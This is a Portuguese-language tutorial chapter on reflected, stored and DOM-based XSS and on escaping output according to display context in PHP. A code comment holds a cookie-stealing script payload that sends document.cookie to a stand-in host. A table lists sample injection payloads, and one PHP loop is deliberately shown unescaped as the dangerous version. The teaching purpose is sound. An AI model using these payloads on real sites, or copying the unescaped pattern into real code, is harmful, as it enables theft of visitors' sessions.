---
order: 11
---

# XSS: reflected, stored e DOM-based

O princípio do XSS (*Cross-Site Scripting*) já é apresentado em [Protegendo seus dados](/?c=langages&s=php&p=securite) (`htmlspecialchars()`, caso *reflected*) e em [Criar e manipular elementos](/?c=langages&s=javascript&p=html-elements) (`innerHTML` vs `textContent`, caso *DOM-based*). Este capítulo não repete esses mecanismos: ele estabelece a distinção entre as três variantes (o que realmente muda entre elas), e depois cobre o que ainda falta: o armazenamento em banco (*stored*) e o escape de acordo com o CONTEXTO de exibição.

## As três variantes: onde vive o dado armadilhado antes de ser exibido

A diferença entre as três se resume a UM único ponto: onde o dado malicioso permanece antes de terminar executado no navegador da vítima.

```text
REFLECTED (ja visto: htmlspecialchars)
  Vitima envia uma requisicao armadilhada --> Servidor a devolve TAL QUAL em sua resposta --> Navegador a executa
  (o dado apenas faz uma ida e volta, nunca armazenado)

STORED (novo neste capitulo)
  Atacante --> Dado armadilhado salvo no banco (comentario, apelido, avaliacao...)
                          |
                          v
  QUALQUER vitima que consulte essa pagina depois --> executa o payload
  (o dado permanece armazenado: uma unica injecao afeta todos os visitantes seguintes)

DOM-BASED (ja visto: innerHTML vs textContent)
  Dado armadilhado lido diretamente por JavaScript do lado do NAVEGADOR (ex.: um parametro de URL)
  --> nunca devolvido pelo servidor, nunca armazenado: tudo se passa no navegador da vitima
```

| Variante | Onde o dado transita | Quem é afetado | Já coberto |
|---|---|---|---|
| Reflected | Requisição → resposta do servidor, imediatamente | Somente a vítima que clica em um link armadilhado | [`htmlspecialchars()`](/?c=langages&s=php&p=securite) |
| Stored | Banco de dados, entre duas visitas | Todo visitante da página afetada, sem nenhuma ação armadilhada de sua parte | Seção abaixo |
| DOM-based | Nunca devolvido pelo servidor, lido em JS do lado do navegador | A vítima, via um dado que o PRÓPRIO navegador dela lê (URL, `localStorage`...) | [`innerHTML` vs `textContent`](/?c=langages&s=javascript&p=html-elements) |

## Stored XSS: a variante que já não depende da vítima

Um formulário de comentário, um apelido, uma avaliação de cliente: qualquer dado de usuário SALVO e depois reexibido a outros visitantes é um alvo stored se não for escapado no momento da exibição.

```php
// Salvamento (sem risco aqui por si so: estamos apenas armazenando texto)
$pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentario]);

// PERIGOSO: reexibido depois, sem escape
foreach ($comentarios as $c) {
    // se um atacante postou
    // <script>document.location='https://roubo.example/?c='+document.cookie</script>,
    echo $c['texto'];
                        // ESSE CODIGO EXECUTA em CADA visitante que ve esse comentario
}

// SEGURO: mesmo reflexo do reflected, aplicado no momento da EXIBICAO, nao do salvamento
foreach ($comentarios as $c) {
    echo htmlspecialchars($c['texto']);
}
```

> **Cuidado:** escapar o dado no SALVAMENTO em vez de na EXIBIÇÃO. Parece intuitivo ("limpo a entrada uma vez por todas"), mas quebra assim que o mesmo dado é reexibido em um contexto diferente (uma página HTML, uma exportação CSV, uma notificação por email) que não precisa do mesmo escape (veja os contextos abaixo). O escape sempre acontece pouco antes da exibição, nunca antes do armazenamento.

## O escape depende do CONTEXTO de exibição, não apenas do texto

`htmlspecialchars()` protege um dado inserido no CORPO de uma página HTML. O mesmo reflexo aplicado em outro contexto não protege contra o mesmo risco:

| Contexto de inserção | Exemplo de payload perigoso | Proteção adequada |
|---|---|---|
| Corpo HTML (texto entre duas tags) | `<script>...</script>` | `htmlspecialchars()` (já visto) |
| Atributo HTML (`<input value="...">`) | `" onmouseover="alert(1)` (fecha o atributo, adiciona um novo) | Sempre envolver o atributo com aspas E aplicar `htmlspecialchars()` a ele (que também escapa `"`) |
| URL (`<a href="...">`) | `javascript:alert(document.cookie)` como valor de URL | Verificar se a URL começa com um protocolo permitido (`http://`, `https://`) antes de inseri-la |
| JavaScript inline (`<script>var x = "...";</script>`) | `"; alert(1); //` (fecha a string JS, adiciona uma instrução) | Nunca inserir um dado de usuário diretamente em JavaScript inline: passá-lo por um atributo `data-*` lido depois do lado JS, ou por JSON com um escape dedicado a esse contexto |

> **Boa prática:** identificar o contexto exato de inserção (corpo de texto, atributo, URL, JS) antes de escolher o escape, em vez de aplicar `htmlspecialchars()` por reflexo em todo lugar supondo que sempre basta.

---

## 📋 Recapitulando

| | |
|---|---|
| **Para lembrar** | As três variantes de XSS se distinguem por onde vive o dado armadilhado antes da execução: ida e volta imediata (reflected), armazenado em banco e repetido em cada visita (stored), ou nunca devolvido pelo servidor e lido diretamente em JS do lado do navegador (DOM-based). O escape correto depende do contexto de inserção (corpo HTML, atributo, URL, JS inline), não apenas da presença de um dado de usuário. |
| **Ferramentas utilizáveis** | `htmlspecialchars()` para o corpo HTML e os atributos; verificação de protocolo para uma URL; `data-*` + leitura JS para um dado destinado a JavaScript. |
| **Armadilhas a evitar** | Escapar um dado no salvamento em vez de na exibição; aplicar o mesmo escape independentemente do contexto de inserção. |
| **Boas práticas** | Escapar sistematicamente no momento da exibição, nunca antes; adaptar o escape ao contexto exato (HTML/atributo/URL/JS). |
